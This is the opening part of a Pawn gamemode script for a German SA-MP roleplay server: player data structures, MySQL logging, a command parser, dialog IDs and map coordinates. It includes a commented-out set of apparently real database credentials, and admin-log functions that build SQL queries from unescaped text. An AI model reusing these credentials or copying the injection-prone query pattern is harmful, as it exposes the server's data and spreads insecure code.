/*##############################################
#       ///////////////       	////  v0.0.1a  #
#     ///            			////           #
#   ////          				////           #
#   ///           				////           #
#  ////         				////           #
#   ///         				////           #
#    ////          				////           #
#     ////////////////       	////           #
#                                              #
#   Geistiges Eigentum von Andy und McGarrett  #
#   Besitz und nutzen wird Strafrechtlich      #
#   verfolgt. (Nach dem Verkauf ist dieser     #
#   Passus nicht mehr relevant ~Bobby Dez'2019 #
#											   #
#											   #
#	Aufarbeitung der verlorenengegangen        #
#	Datenbank durch Rocky und Akino Kiritani   #
#	Jan'2020  								   #
#											   #	
################################################

Updates:

Aktuelle Bug-Liste:
- Wenn ein Trucker kaputt geht? Zurücksetzen alles!

*/

#include <a_samp>
#include <streamer>
#include <Encrypt>
#include <sscanf2>
#include <a_mysql>
//#include <mapandreas>
//#include "../include/gl_common.inc"
//#include <DT_MapStealerFucker>
//Host
#define MYSQL_HOST     	"localhost"
#define MYSQL_USER      "root"
#define MYSQL_PASS      ""
#define MYSQL_DATA      "county"
//Host
/*#define MYSQL_HOST     "ms772.gamedata.io"
#define MYSQL_USER      "ni965538_1_DB"
#define MYSQL_PASS      "1ZQM9y3d"
#define MYSQL_DATA      "ni965538_1_DB"*/

forward Float:EntfernungZwischenSpielern(p1,p2);

new baseurl[] = "https://county-islands.com/models";// zb
new playerradio[MAX_PLAYERS];
new playersirene[MAX_PLAYERS];
new sireneaktivbomb = 0;
new Bombentimer5;
new bombenspieler = -1;
new geldtransporter = -1;
new geldtransporterdriver = -1;
new geldtransportertime = 100;
new geldtransporteraktiv = 0;
#pragma dynamic 100000
new tresordarf = 0;
new atombreak = 0;
new zunderklauen = 0;
new Float:TUNINGKOSTEN = 90.0;
new punktezahlen;
new Text:atomtext[3];
new Userwerben[MAX_PLAYERS];
new Tankstelle1;
new Tankstelle2;
new Moneytimer[MAX_PLAYERS];
new truckrespawn[MAX_PLAYERS];
new jpbereits[MAX_PLAYERS];
new Tankstelle3;
//new Missionenan[MAX_PLAYERS];
new Werbeschild1;
new rangmerken[MAX_PLAYERS];
//#include <AC>
new Ticketmerk[MAX_PLAYERS],Ticketplayer[MAX_PLAYERS];
// MAP
new standartstring[265];
new inwelchemladen[MAX_PLAYERS];
new welchetanke[MAX_PLAYERS];
new Admindiensttimer[MAX_PLAYERS];
new PlayerKoks[MAX_PLAYERS];
#define SendFormatMessage(%0,%1,%2,%3) format(standartstring, sizeof(standartstring),%2,%3) && SendClientMessage(%0, %1, standartstring)
#define SendFormatMessageToAll(%1,%2,%3) format(standartstring, sizeof(standartstring),%2,%3) && SendClientMessageToAll(%1, standartstring)
#define ForAllPlayers(%0) for(new index_%0=0,%0=ConnectedPlayerList[0]; index_%0<ConnectedPlayers; index_%0++,%0=ConnectedPlayerList[index_%0])
new PlayerTrucker[MAX_PLAYERS],
PlayerTruckmodus[MAX_PLAYERS],
TruckSpritmodus[MAX_PLAYERS],
Abpumpen[MAX_PLAYERS],
PlayerProdukt[MAX_PLAYERS],
vehicleprodukte[MAX_VEHICLES],
playervehiclemerk[MAX_PLAYERS],
Truckertimer[MAX_PLAYERS],
truckercp,
auslosexd[MAX_PLAYERS];
new robTM[MAX_PLAYERS];
new Baumholz[56];
new Baumstatus[56];
new Baumleben[56];
new baumsekunde[56];
new Float:baume[56][3] = {
{2680.59912, -8826.97559, 3.14581},
{2704.08154, -8770.63867, 3.14581},
{4319.68604, -8651.28125, 3.38413},
{4314.84326, -8789.51172, 3.28110},
{4234.44775, -8807.31641, 3.06985},
{3077.11865, -8658.45703, 3.37988},
{3458.73413, -8634.21582, 3.35888},
{3352.41187, -8659.33301, 3.35890},
{6355.07617, -9663.41113, 6.25812},
{6370.47412, -9745.09375, 7.18708},
{6151.38281, -9812.14258, 7.52270},
{5941.74854, -9726.07324, 7.65550},
{6253.86914, -9326.91211, 3.01187},
{5993.38721, -9279.83008, 3.01187},
{5905.96973, -9320.50781, 3.01187},
{5634.46094, -9279.74902, 3.01187},
{5409.34473, -9318.71094, 2.91187},
{5042.71387, -9271.66895, 2.91187},
{4628.15430, -9335.24609, 2.91187},
{4189.16113, -9226.24512, 2.84759},
{4218.35400, -9166.02832, 2.79960},
{3861.03687, -9320.01563, 3.08414},
{2633.99707, -9333.65625, 3.07665},
{2708.20801, -9318.15332, 3.07665},
{2627.54614, -9283.54199, 3.07665},
{2259.88623, -9320.09277, 3.08365},
{2233.32617, -9278.96484, 3.08365},
{1640.66687, -8666.38672, 3.14449},
{1675.00854, -8655.98926, 3.04043},
{1725.69678, -7758.43799, 3.17411},
{1730.67798, -7776.23145, 2.97310},
{1745.97693, -7721.99707, 2.96907},
{4156.56738, -7678.72900, 3.23472},
{4161.04102, -7638.10889, 3.03577},
{4277.52100, -7538.39600, 3.03577},
{4354.25293, -7740.31592, 3.03577},
{6383.73096, -7572.87549, 2.53998},
{6358.41797, -7692.77197, 2.94602},
{6489.64600, -7839.44043, 2.94602},
{6448.36768, -7947.21387, 2.84299},
{6394.04736, -8322.28125, 3.17824},
{6408.07813, -8558.30664, 3.17824},
{6465.82520, -9138.98730, 3.05482},
{6367.27881, -9073.41211, 3.05482},
{6452.73535, -9459.76172, 2.64878},
{4321.98486, -7816.72803, 3.27949},
{4348.05225, -7804.41846, 3.27949},
{6351.91846, -8256.87500, 3.37568},
{6346.80420, -8391.90137, 3.37568},
{6347.06738, -8571.47266, 3.37568},
{6379.53320, -8693.03906, 3.37568},
{6349.00098, -9051.29102, 3.34884},
{2366.92163, -9311.12012, 3.38427},
{1836.46667, -8888.89844, 3.20708},
{1678.56311, -8306.81445, 3.42537},
{1672.38391, -8333.45703, 3.42537}
};




new Angeltimerxd[MAX_PLAYERS];
new rob_targetID[MAX_PLAYERS] = -1;
new bool:inROB[MAX_PLAYERS]=false;
forward rob_timer(playerid);
new Bombenplatz[MAX_PLAYERS];
new bankdarf;
new Banktimer;
new banktuerexplodee;
new armytorspam[MAX_PLAYERS];
new Banktimer2;
new bizidmerk[MAX_PLAYERS];
new kannwuerfel;
new spielerw1 = -1;
new sfpdgatex;
new feuerzahl = -1;
new spielerw2 = -1;
new Float:wuerfelgeld;
new sperrzone = 0;
new sperrzonef;
new Float:sperre[4];
new bombenobject = 1654;
new ConnectedPlayers;
new angelnerlaubt[MAX_PLAYERS];
new ConnectedPlayerList[MAX_PLAYERS+1];
new Float:Ticket[MAX_PLAYERS];
new TicketErsteller[MAX_PLAYERS];
new event_art=0,event_ct=3,event_players=0;
new Float:event_jackpot=0.0,bool:event_firstblood=false;
new bool:in_event[MAX_PLAYERS]=false;
new event_kills[MAX_PLAYERS]=0;
new event_state=0;
new eventTM,eventTM2,eventTM3;
new event_leaderID = -1;
new robTM2[MAX_PLAYERS];
new bool:rob_sperre[MAX_PLAYERS]=false;
forward rob_sperreTM(playerid);
forward event_ct_tm();
new PlayerText:Orttext[MAX_PLAYERS];
new Text:county_map[37];new PlayerText:county_map_pl[MAX_PLAYERS];
new bool:ci_map_blink[MAX_PLAYERS]=false; new ci_map_selected[MAX_PLAYERS]=0;
new bool:ci_map_state[MAX_PLAYERS]=false; new ci_map_blinkTM[MAX_PLAYERS];
forward ci_map_b(playerid);
#define DIALOG_CIMAP 5000
#define DIALOG_CIMAPINFO 5001
#define DIALOG_EVENTCREATE 5002
#define DIALOG_EVENTJOIN 5003
forward event_ct_tm2();
forward event_ct_tm3();

new Float:event_pb_spawns[][6] =//Event Arena Paintball - Spawn´s
{
    {6530.2939,-7579.9585,6.6051,234.3288},
    {6583.7925,-7596.6870,6.5973,176.6750},
    {6607.6470,-7656.0454,6.5973,37.8670},
	{6551.1299,-7647.0322,6.8596,307.9395},
	{6527.6387,-7645.5879,6.6051,105.6926}
};
enum rangeee
{
	rangname[50]
};
new Rangname[18][9][rangeee];
new bombenklauen = 0;
new sftor,
fischauswahl[MAX_PLAYERS];
new Banktuerls;
new armyhacktor;
new armytor[2];
new armytorx[2];
forward Armytorzu();
new PASSWORD = 987;
new persobeantragt[MAX_PLAYERS];
new skinchange[MAX_PLAYERS];
new sirenean = 0;
new fmerken[MAX_PLAYERS],kannblitz[MAX_PLAYERS];
new imtut[MAX_PLAYERS];
new Text:GangwarT[5];
new frakpayday;
native IsValidVehicle(vehicleid);
new Anion[MAX_PLAYERS];
new Text:UserBr[13];
new Text:blitzerfl;
new Text:GeldAnzeige[3];
new PlayerText:GeldAnzeigewert[MAX_PLAYERS];
new AntiFlood[MAX_PLAYERS][2];
new failpw[MAX_PLAYERS];
new TUTTIMER[MAX_PLAYERS],tutorialcp[MAX_PLAYERS];
new PrivcarRep = 0;
new PlayerText:Wantedtext[2][MAX_PLAYERS];
new PlayerText:Ladebalken[MAX_PLAYERS][3];
new PlayerText:Bankklau[MAX_PLAYERS][2];
new Bankraubtextdraw[MAX_PLAYERS];
new Float:Bankraubgeld[MAX_PLAYERS];
new wangezeigt[MAX_PLAYERS];
new server_actors[22];
//----------[Command System]--------
forward cmdOnPlayerCommandText(playerid,cmdtext[]);
#define MYSQL_API_CHECK 1
#define cmd:%1(%2) forward cmd_%1(%2);\
public cmd_%1(%2)
#define flashtime 115
enum uInfo
{
	uID,
 	Float:uKonto,
 	Float:uGeld,
 	uLevel,
 	uKredit,
	uAdmin,
	uPerso,
	uLeiter,
	uMitglied,
	uRang,
	uEXP,
	Float:uPosX,
	Float:uPosY,
	Float:uPosZ,
	uInt,
	uWelt,
	uSkin,
	uZiviFrak,
	uZiviSkin,
	uFuehrerschein,
	uHelischein,
	uBootsschein,
	uMotorradschein,
	uRollerschein,
	uLKWschein,
	uWaffenschein,
	uTheorie,
	uKnastZeit,
	uGefangen,
	uWantedLevel,
	uDienst,
	uHausschluessel,
	uGeschaeftschluessel,
	uPayDaySekunden,
	uStumm,
	uEingeloggt,
	uSpielzeit,
	uSpielzeitLogin,
	uAFK,
	uDesktop,
	uHunger,
	uJob,
	uTod,
	uArbeitslosengeld,
	uTode,
	uKills,
	uWarns,
	uHandy,
	uHandynummer,
	uTelefonbuch,
	uTelefonbucheintrag,
	uTimebann,
	uGras,
	uKoks,
	uLSD,
	upunkte,
	uBan,
	uGeschlecht,
	uStrafe,
	uStrafCP,
	uTutorial,
	uRepair,
 	sitzungsid,
 	contime,
 	funkstatus,
 	funkstatus_beschreibung[64],
 	uJahr,
 	uMonat,
	uTag,
	uGWD,
	uStartbonus,
	ustarttut,
	ufMissionen,
	ufBeruf,
	ufATM,
	ufAutokauf,
	ufShop,
	ufHandy,
	ufAngel,
	ufMarkt,
	ufGras,
	ufSchwarz,
	ufBombe,
	ufWaffenschein,
	ufFuhrerschein,
	ufPerso,
	uMissionen,
	uSpawn,
	uWerbunguser,
	uVerstrahlt,
	uAngelnerlaubt,
	uAngelnerlaubt2
}
new SpielerInfo[MAX_PLAYERS][uInfo];
new dbhandle;

forward panelfiles(playerid, adminid, typ,const reason[]);
public panelfiles(playerid, adminid, typ,const reason[])
{
	if(IsPlayerNPC(playerid))return 1;
	new query[1000];
	new string[400];
	new topic[30];
	topic = "";
	new adminidx = -1;
	if(typ == 1)
	{
	    if(adminid == -1)
	    {
	        topic = "Verwarnung";
			format(string,sizeof(string),"Wurde vom System verwarnt. [%s]",reason);
	    }
	    else
	    {
	        topic = "Verwarnung";
			format(string,sizeof(string),"Wurde von %s verwarnt. [%s]",PlayerName(adminid),reason);
			adminidx = SpielerInfo[adminid][uID];
	    }
	}
	else if(typ == 2)
	{
		if(adminid == -1)
	    {
	        topic = "Ban";
	    	format(string,sizeof(string),"Wurde vom System gebannt. [%s]",reason);
	    }
	    else
	    {
	        topic = "Ban";
	    	format(string,sizeof(string),"Wurde von %s gebannt. [%s]",PlayerName(adminid),reason);
	    	adminidx = SpielerInfo[adminid][uID];
	    }
	    format(string,sizeof string,"UPDATE `user` SET banAdmin='%i',banTime='%i',banReason='%s' WHERE userID='%d'",adminidx,gettime(),reason,SpielerInfo[playerid][uID]);
		mysql_query(dbhandle, string);
	}
	else if(typ == 3)
	{
 		if(adminid == -1)
	    {
	        topic = "Prison";
			format(string,sizeof(string),"Wurde vom System ins Prison gesteckt. [%s]",reason);
	    }
	    else
	    {
	        topic = "Prison";
			format(string,sizeof(string),"Wurde von %s ins Prison gesteckt. [%s]",PlayerName(adminid),reason);
			adminidx = SpielerInfo[adminid][uID];
	    }
	}
	format(query, sizeof(query), "INSERT INTO panel_files (userid,adminid,time,typ,topic,content) VALUES (%i,%i,%i,%i,'%s','%s')", SpielerInfo[playerid][uID], SpielerInfo[adminid][uID], gettime(), typ, topic,string);
	mysql_query(dbhandle, query);
	printf("%s",query);
	return 1;
}

forward log(playerid, typ, log[]);
public log(playerid,typ, log[])
{
	if(IsPlayerNPC(playerid))return 1;
	new query[512], log_ip[39];
	if(playerid==-1)log_ip = "noip";
	else{GetPlayerIp(playerid, log_ip, sizeof(log_ip));}
	new tmp [150];
	mysql_escape_string(log, tmp);
	format(query, sizeof(query), "INSERT INTO serverlogs (id, Name, time, typ, log, ip) VALUES (%i, '%s', %i, %i, '%s', '%s')", SpielerInfo[playerid][uID], PlayerName(playerid), gettime(), typ, tmp, log_ip);
	mysql_query(dbhandle, query);
	printf("%s",query);
	return 1;
}

public OnPlayerCommandText(playerid,cmdtext[])
{
	if(gettime()-AntiFlood[playerid][0] < 1) { AntiFlood[playerid][0] = gettime(); return SendClientMessage(playerid,0xFF0000FF,"Du kannst nur einmal in der Sekunde einen Befehl nutzen!"); }
	log(playerid, 2, cmdtext);
	AntiFlood[playerid][0] = gettime();
    cmdtext[0]='_';
    new cmdStr[128],cmdParams[128],bool:cmdAffe,cmdFu;
	for(new i;i<128;i++)
	{
	    if(cmdtext[i]=='\0')break;
	    if((cmdtext[i]==' ')&&(!cmdAffe))
		{
			cmdAffe=true;
			continue;
		}
	    if(!cmdAffe)cmdStr[i]=cmdtext[i];
	    else
		{
			cmdParams[cmdFu]=cmdtext[i];
			cmdFu++;
		}
	}
	format(cmdStr,128,"cmd%s",cmdStr);
	if(!strlen(cmdParams))format(cmdParams,128," ");
	new i,cmdStr2[128];
    while (cmdStr[++i])
    {
        if ('A' <= cmdStr[i] <= 'Z') cmdStr[i] |= 0x20;
        if(cmdStr[i] == 0xE4 || cmdStr[i] == 0xC4) // ä / Ä
		{
		    format(cmdStr2,128,"%s",cmdStr);
			cmdStr2[i] = 'a';
			cmdStr2[i+1] = 'e';
			for(new o = i+2; o < 128; o++)
			{
			    cmdStr2[o] = cmdStr[o-1];
			}
			printf("%s",cmdStr2);
			format(cmdStr,128,"%s",cmdStr2);
    	}
    	if(cmdStr[i] == 0xF6 || cmdStr[i] == 0xD6) // ö / Ö
		{
		    format(cmdStr2,128,"%s",cmdStr);
			cmdStr2[i] = 'o';
			cmdStr2[i+1] = 'e';
			for(new o = i+2; o < 128; o++)
			{
			    cmdStr2[o] = cmdStr[o-1];
			}
			format(cmdStr,128,"%s",cmdStr2);
    	}
    	if(cmdStr[i] == 0xFC || cmdStr[i] == 0xDC) // ü / Ü
		{
		    format(cmdStr2,128,"%s",cmdStr);
			cmdStr2[i] = 'u';
			cmdStr2[i+1] = 'e';
			for(new o = i+2; o < 128; o++)
			{
			    cmdStr2[o] = cmdStr[o-1];
			}
			format(cmdStr,128,"%s",cmdStr2);
    	}
    	if(cmdStr[i] == 0xDF) // ß
		{
		    format(cmdStr2,128,"%s",cmdStr);
			cmdStr2[i] = 's';
			cmdStr2[i+1] = 's';
			for(new o = i+2; o < 128; o++)
			{
			    cmdStr2[o] = cmdStr[o-1];
			}
			format(cmdStr,128,"%s",cmdStr2);
    	}
    }
	if(CallLocalFunction(cmdStr,"ds",playerid,cmdParams)) return 1;
	cmdtext[0]='/';
	new string[100];
	format(string,sizeof string,"Den Befehl %s gibt es nicht!",cmdtext);
	return SendClientMessage(playerid,0xFF0000FF,string);
}
#define OnPlayerCommandText cmdOnPlayerCommandText
#define HOLDING(%0) \
	((newkeys & (%0)) == (%0))
new MonthTimes[12][3] =
{
	{ 31, 31, 2678400 },
	{ 28, 29, 2505600 },
	{ 31, 31, 2678400 },
	{ 30, 30, 2592000 },
	{ 31, 31, 2678400 },
	{ 30, 30, 2592000 },
	{ 31, 31, 2678400 },
	{ 31, 31, 2678400 },
	{ 30, 30, 2592000 },
	{ 31, 31, 2678400 },
	{ 30, 30, 2592000 },
	{ 31, 31, 2678400 }
};
//---------[Defines]-----------
#define COLOR_GOLD 			0xB8860BAA
#define COLOR_ORANGE 		0xFF6600FF
#define COLOR_BLACK 		0x3C3C3CFF
#define COLOR_GREEN 		0x33BB33AA
#define COLOR_RED 			0xAA3333AA
#define COLOR_LIGHTRED 		0xFF6347AA
#define COLOR_LIGHTBLUE 	0x33CCFFAA
#define COLOR_LIGHTGREEN 	0x9ACD32AA
#define COLOR_YELLOW 		0xFFFF00AA
#define COLOR_WHITE 		0xFFFFFFAA
#define COLOR_PURPLE 		0xC2A2DAAA
#define COLOR_BLUE 			0x009BFFFF
#define COLOR_NEWS 			0xFFA500AA
#define COLOR_OOC 			0x33B0ABFF
#define COLOR_ADMIN 		0x8FE2EAA
#define COLOR_AFK 			0x00E5FF
#define COLOR_GREY 			0x8C8C8CFF
#define COLOR_POLICE 		0x005FFFFF
#define COLOR_MEDIC 		0xFFC800FF
#define COLOR_FIRE 			0xD70000FF
#define COLOR_OFF 			0xFFFFFFFF
#define COLOR_TOWING 		0xFFF144FF
#define COLOR_BOT 			0xDCDCDCFF
#define COLOR_HQ 			0x5773FFFF
#define COLOR_BALLAS        0xC800FFAA
#define COLOR_GROVE         0x239700AA
#define COLOR_ATZE          0x00E1FFAA
#define COLOR_LCN           0x323232AA
#define COLOR_YAKUZA        0x050000AA
#define COLOR_TUT           0xF56F37FF
#define COLOR_WEISS         0xFEFEFEFF
#define COLOR_ARMY          0x00AD1EFF
#define COLOR_VAGOS         0xFFF000FF
#define COLOR_Mayans_MC	    0x005FFFFF

//Blinker System
#define BLINK_DISABLE_ON_EXIT_VEHICLE   1   // 0 - 1 = Wenn 1, Blinker gehen aus wenn Spieler Ihr  verlassen, aber bei Wankblinker nicht.
#define BLINK_ALLOW_EMERGENCY           0   // 0 - 1, Erlaube Spieler den Warnblinker zu benutzen.#
#define SendClientMessageEx(%0,%1,%2,%3) format(string,sizeof string,%2,%3),SendClientMessage(%0,%1,string)

#define BLINK_TURN_ANGLE 55.0

#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
//----[ENDE BLINKER SYSTEM]-----

const Float:INF_FLOAT=Float:0x7F800000;

#define MAX_INVENTAR 99
#define MAX_HAEUSER 20
//---------[Dialoge]---------
#define Login 								1
#define Registrieren 						2
#define Frak_Einladung 						3
#define ADMIN_KICK 							4
#define ADMIN_BANN 							5
#define ADMIN_WARN 							6
#define ADMIN_LEBEN 						7
#define ADMIN_RUESTUNG 						8
#define ADMIN_INT 							9
#define ADMIN_WELT 							10
#define ADMIN_SAY 							11
#define TUNING_PAINTJOB 					12
#define TUNING_NITRO 						13
#define Radio 								19
#define DIALOG_TUEREN 						20
#define DIALOG_HAUS_OBJEKT 					21
#define DIALOG_BANK_EINZAHLEN			 	22
#define DIALOG_BANK_AUSZAHLEN 				23
#define DIALOG_BANK_UEBERWEISEN 			24
#define DIALOG_BANK_UEBERWEISEN2 			25
#define DIALOG_BANK_UEBERWEISEN3 			26
#define DIALOG_BANK_UEBERWEISEN4 			27
#define DIALOG_MSGBOX 						28
#define DIALOG_SERVERNEWS 					30
#define DIALOG_HEILUNG 						31
#define BANK_KREDIT 						32
#define BANK_KREDIT2 						33
#define DIALOG_PNS 							34
#define DIALOG_AKTIONEN 					35
#define DIALOG_HAUSKAUF 					36
#define DIALOG_MOEBELKAUF 					37
#define DIALOG_INVENTAR 					38
#define DIALOG_INVENTAR2 					39
#define DIALOG_INVENTAR3 					40
#define DIALOG_INVENTARKAUF 				41
#define DIALOG_MUELTONNE 					42
#define DIALOG_JOBCENTER 					43
#define DIALOG_AUTOKAUF 					44
#define DIALOG_FRAKMENU 					45
#define DIALOG_FRAKMENU_USER 				46
#define DIALOG_FRAKMENU_CARS 				47
#define DIALOG_FRAKMENU_USER_ACTION 		48
#define DIALOG_FRAKMENU_USER_ACTION_RANK 	49
#define DIALOG_FRAKMENU_FRAKKASSE 			50
#define DIALOG_FRAKMENU_FRAKKASSE_INPUT 	51
#define DIALOG_FRAKMENU_FRAKKASSE_OUTPUT 	52
#define DIALOG_FRAKMENU_CARS_ACTION 		53
#define DIALOG_FRAKMENU_CARS_RANK 			54
#define DIALOG_FRAKMENU_CARS_SELL 			55
#define DIALOG_HILFE 						56
#define DIALOG_WIEDERBELEBEN 				57
#define AUTO_FREIKAUFEN 					58
#define DIALOG_STADTHALLE 					59
#define DIALOG_KFZ 							60
#define DIALOG_ROLLERKAUF 					61
#define DIALOG_ADMINPORT 					62
#define DIALOG_SKINCHANGE 					63
#define DIALOG_SUPPORT 						64
#define DIALOG_TICKETS			 			65
#define DIALOG_TICKETS_ANTWORT 				66
#define DIALOG_CARINFO 						67
#define DIALOG_SUPPORT2 					68
#define DIALOG_WAFFENKAUF 					69
#define DIALOG_AUFZUG 						70
#define DIALOG_RADIO 						71
#define DIALOG_SHOP 						72
#define DIALOG_PFAND	 					73
#define DIALOG_TELEBUCH 					74
#define DIALOG_HOTEL 						75
#define DIALOG_MIETEN 						76
#define DIALOG_FBI 							77
#define DIALOG_THEORIE 						78
#define DIALOG_FAHRSCHULE 					79
#define DIALOG_ALLGEMEINE_HILFE 			80
#define DIALOG_INVENTAR_HILFE 				81
#define DIALOG_PFAND_HILFE 					82
#define DIALOG_AUTO_HILFE 					83
#define DIALOG_JOB_HILFE 					84
#define ADMIN_TIMEBANN 						85
#define ADMIN_TIMEBANN2 					86
#define DIALOG_SCHWARZMARKT 				87
#define DIALOG_SCHWARZMARKT2 				88
#define DIALOG_GANGBIZZ_GANG 				89
#define DIALOG_GANGBIZZ_SETTINGS 			90
#define DIALOG_GANGBIZZ_SETTINGS2 			91
#define DIALOG_GANGBIZZ_KAUF 				92
#define DIALOG_GANGBIZZ_KAUF2 				93
#define DIALOG_GRASSAMEN 					94
#define DIALOG_GESCHLECHT 					95
#define DIALOG_GEBURTSTAG 					96
#define DIALOG_FW1 							97//WIRD NICHT GENUTZT
#define DIALOG_FW2 							98//WIRD NICHT GENUTZT
#define DIALOG_FW3 							99//WIRD NICHT GENUTZT
#define DIALOG_FRAKHILFE 					100
#define DIALOG_MC1 							101
#define DIALOG_MC2 							102
#define DIALOG_SANI 						103
#define DIALOG_EMAIL 						104
#define DIALOG_ORTSPAWN                     105
#define DIALOG_TIMEL                        106
#define DIALOG_NAVI1                 		107
#define DIALOG_NAVI2                		108
#define DIALOG_NAVI3                		109
#define DIALOG_NAVI4                 		110
#define DIALOG_NAVI5                 		111
#define DIALOG_PD1                          112
#define DIALOG_PD2                          113
#define DIALOG_PD3                          114
#define DIALOG_PD4                          115
#define DIALOG_PD5                          116
#define DIALOG_PD6                          117
#define DIALOG_AHAUS                        118
#define DIALOG_AUTO1                        119
#define DIALOG_AUTO2                        120
#define DIALOG_AUTO3                        121
#define DIALOG_AUTO4                        122
#define DIALOG_AUTO5                        123
#define DIALOG_AUTO6                        124
#define DIALOG_MLS                          125
#define DIALOG_MLS1                         126
#define DIALOG_MLS2                         127
#define DIALOG_MLS3                         128
#define DIALOG_FD                         	129
#define DIALOG_FD1                         	130
#define DIALOG_FD2                          131
#define DIALOG_FD3                          132
#define DIALOG_FREIK                        133
#define DIALOG_WS                           134
#define DIALOG_WS1                          135
#define DIALOG_WS2						    137
#define DIALOG_KFZ2						    138
#define DIALOG_KFZ3						    139
#define DIALOG_PW						    140
#define DIALOG_ROLLERM                      141
#define DIALOG_DRUUG                        142
#define DIALOG_REPA1                        143
#define DIALOG_SERVICE                      144
#define DIALOG_FUHR                         145
#define DIALOG_ALARMIERUNG                  146
#define DIALOG_TUERENAUF                    147
#define DIALOG_GROVE                        148
#define DIALOG_GROVE1                       149
#define DIALOG_GROVE2                       150
#define DIALOG_GROVE3                       151
#define DIALOG_FLAGER                       152
#define DIALOG_FLAGER2                      153
#define DIALOG_FLAGER3                      154
#define DIALOG_FLAGER4                      155
#define DIALOG_FLAGER5                      156
#define DIALOG_FLAGER6                      157
#define DIALOG_FLAGER7                      158
#define DIALOG_FLAGER8                      159
#define DIALOG_SKINW                        160
#define DIALOG_SKINS                        161
#define DIALOG_SKINB                        162
#define DIALOG_SKING                        163
#define DIALOG_SKINA                        164
#define DIALOG_SKINL                        165
#define DIALOG_SKINY                        166
#define DIALOG_SWAT                         167
#define DIALOG_SUPANN                       168
#define DIALOG_EVENT                        169
#define DIALOG_TRUCKER1                     170
#define DIALOG_TRUCKER2                     171
#define DIALOG_BURGER                       172
#define DIALOG_PIZZA                        173
#define DIALOG_WAYNE                        174
#define DIALOG_FISCHE                       175
#define DIALOG_VERKAUFFISCH                 176
#define DIALOG_FISCHSM                      177
#define DIALOG_FISCHSM2                     178
#define DIALOG_SCHWARZM                     179
#define DIALOG_BOMBSETZ                     180
#define DIALOG_ARMY1                     	181
#define DIALOG_ARMY2                     	182
#define DIALOG_ARMY3                     	183
#define DIALOG_WUERFEL                     	184
#define DIALOG_BOOM1                        185
#define DIALOG_BOOM2                        186
#define DIALOG_BOOM3                        187
#define DIALOG_SKINVA                       188
#define DIALOG_SKINBI                       189
#define DIALOG_WERBUNG                      190
#define DIALOG_HEALKIT                      191
#define DIALOG_RANG1                        192
#define DIALOG_RANG2                        193
#define DIALOG_TUNING1                      194
#define DIALOG_TUNING2                      195
#define DIALOG_TUNING3                      196
#define DIALOG_TUNING4                      197
#define DIALOG_TUNING5                      198
#define DIALOG_TUNING6                      199
#define DIALOG_TUNING7                      200
#define DIALOG_TUNING8                      201
#define DIALOG_TUNING9                      202
#define DIALOG_TUNING10                     203
#define DIALOG_TUNING11                     204
#define DIALOG_TUNING12                     205
#define DIALOG_TUNING13                     206
#define DIALOG_TUNING14                     207
#define DIALOG_REIFEN                       208
#define DIALOG_BIZKAUF                      209
#define DIALOG_TRUCKERS1                    210
#define DIALOG_SPAWNEN                      211
#define DIALOG_SPAWNEN2                     212
#define DIALOG_SPAWNEN3                     213
#define DIALOG_WERBEN                       214
#define DIALOG_NAVIG                        215
#define DIALOG_NAVIF                        216
#define DIALOG_SPAWNENREG                   217
#define DIALOG_SPAWNENREG2                  218
#define DIALOG_GELDTRANS                    219
#define DIALOG_TRUCKEROEL                   220
#define DIALOG_SKINWAHL                     221
//----------[Variablen]----------
new Musikbox[3];
new Musikboxm[3];
new Float:BoomBox[3][3];
new Musikboxdrinne[MAX_PLAYERS];
new Musikobject[3];
new Fraktionen[18][27] = {
"Zivilisten",
"LSPD",
"SFPD",
"SFFR",
"LSFR",
"NICHT VORHANDEN",
"City Radio",
"Ballas",
"Grove Street",
"Aztecas",
"LCN",
"Yakuza",
"Hitman",
"NICHT VORHANDEN",
"NICHT VORHANDEN",
"Army",
"Vagos",
"Mayans MC"
};
new auftragsid[MAX_PLAYERS];

//Textdraws
new PlayerText:TachoText[MAX_PLAYERS][18];
new Text:Hunger_box,Text:Hunger_box2,PlayerText:Hungeranzeige[MAX_PLAYERS];
new Text:Bankmenu[12],Text:ATMmenu[10],PlayerText:Bankmenu_Stand[MAX_PLAYERS],PlayerText:ATMmenu_Stand[MAX_PLAYERS];
new Text:AdminPanel[17],PlayerText:AdminPanelName[MAX_PLAYERS];
new Text:Farbtabelle[64],Text:Farbtabelle_hintergrund,PlayerText:Farbtabelle_rahmen[MAX_PLAYERS];
new PlayerText:Autohaus[MAX_PLAYERS][8],PlayerText:AutohausBuy[MAX_PLAYERS][3];
new Text:MoebelInv[20];
new PlayerText:SpielerInventarText[MAX_PLAYERS][38];
new PlayerText:MoebelKauf[MAX_PLAYERS][22];
new Text:EssensMenu[14];
new Text:EssenPizza[14];
new PlayerText:Handy[MAX_PLAYERS][27];
new PlayerText:Missionen[MAX_PLAYERS][30];
new PlayerText:FahrschuleTheo[MAX_PLAYERS][6];
new PlayerText:Gangfight[MAX_PLAYERS][7];
//KnastSpawns
new Float:Oelspuren[19][3] = {
{1821.7814, -9277.7598, 3.2217},
{1600.36658, -9336.03711, 5.59660},
{1684.89282, -9308.40625, 3.41470},
{2469.59717, -9302.51758, 3.22320},
{2700.94653, -8784.83301, 3.21480},
{2546.54517, -7839.81592, 3.22600},
{4335.50537, -7739.17480, 3.2404},
{4331.63525, -8674.74512, 3.21510},
{4593.66846, -9303.23047, 3.21840},
{5568.08105, -9294.82324, 3.22200},
{6342.57910, -9441.85352, 3.22270},
{6338.44678, -8231.47266, 3.21880},
{6508.33984, -7833.94238, 3.21860},
{6304.37207, -7850.03613, 3.22170},
{4331.00195, -7866.75732, 3.21770},
{1767.80505, -7860.54004, 3.23100},
{1654.82776, -8521.17871, 3.22500},
{1741.72876, -8912.34766, 19.76830},
{1697.63037, -8739.17969, 3.21980}
};
new Float:KnastSpawns[3][3] = {
{1557.3250,-9480.3506,7.1537},
{1561.1548,-9479.8838,7.1537},
{1564.7419,-9480.1338,7.1537}
};
new Float:KnastSpawnsSF[3][3] = {
{6490.4551,-7892.3726,4.6186},
{6490.8994,-7888.6934,4.6186},
{6491.2329,-7885.0195,4.6186}
};
#define MAX_AUTOMATEN 26
new Float:BankAutomaten[MAX_AUTOMATEN][6] = {
{6546.03125, -7830.91846, 4.05160,   0.00000, 0.00000, 0.00000},
{5408.06592, -9277.05762, 4.04750,   0.00000, 0.00000, 0.00000},
{6421.27881, -7745.28076, 4.00890,   0.00000, 0.00000, 180.00000},
{6424.16992, -7745.28076, 4.00890,   0.00000, 0.00000, 180.00000},
{6426.78955, -7745.28076, 4.00890,   0.00000, 0.00000, 180.00000},
